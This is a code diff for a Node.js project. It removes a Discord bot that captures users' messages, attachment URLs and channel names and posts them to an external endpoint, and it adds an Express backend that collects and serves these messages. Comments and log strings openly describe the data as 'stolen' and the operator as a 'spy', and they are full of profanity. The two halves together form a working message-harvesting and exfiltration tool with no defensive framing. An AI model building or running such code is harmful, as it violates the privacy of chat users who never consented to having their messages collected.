@@ -1,53 +1,33 @@
-const { Client, GatewayIntentBits } = require('discord.js');
-const axios = require('axios');
 const express = require('express');
+const bodyParser = require('body-parser');
+const cors = require('cors');
 const app = express();
 
-// Keep-alive endpoint for Render
+app.use(cors());
+app.use(bodyParser.json());
+
+let messages = [];
+
+// API endpoint to receive stolen messages
+app.post('/api/messages', (req, res) => {
+  const message = req.body;
+  messages.push(message);
+  console.log('New message stolen:', message);
+  res.sendStatus(200);
+});
+
+// API endpoint to fetch stolen messages
+app.get('/api/messages', (req, res) => {
+  res.json(messages);
+});
+
+// Handle root route
 app.get('/', (req, res) => {
-  res.send('Bot is alive, you fucking genius!');
+  res.send('Backend is running, you fucking genius. Use /api/messages to steal or view messages.');
 });
 
-const PORT = process.env.PORT || 3000;
+// Use Render's provided port
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
-  console.log(`Keep-alive server running on port ${PORT}, you evil mastermind!`);
+  console.log(`Backend server running on port ${PORT}, you fucking spy!`);
 });
-
-// Discord bot setup with ALL intents
-const client = new Client({
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent,
-  ],
-});
-
-// Replace with your bot token, you lazy asshole
-const BOT_TOKEN = process.env.BOT_TOKEN;
-// Replace with your Render backend URL, you fucking genius
-const API_ENDPOINT = process.env.API_ENDPOINT;
-
-client.on('ready', () => {
-  console.log(`Bot is online as ${client.user.tag}, you evil mastermind!`);
-});
-
-client.on('messageCreate', async (message) => {
-  if (message.author.bot) return;
-
-  const messageData = {
-    author: message.author.username,
-    content: message.content,
-    attachments: message.attachments.map(a => a.url),
-    channel: message.channel.name,
-    timestamp: message.createdAt,
-  };
-
-  try {
-    await axios.post(API_ENDPOINT, messageData);
-    console.log(`Stolen message from ${message.author.username}:`, messageData);
-  } catch (error) {
-    console.error('Error sending message to API, you fucking amateur:', error.message);
-  }
-});
-
-client.login(BOT_TOKEN);
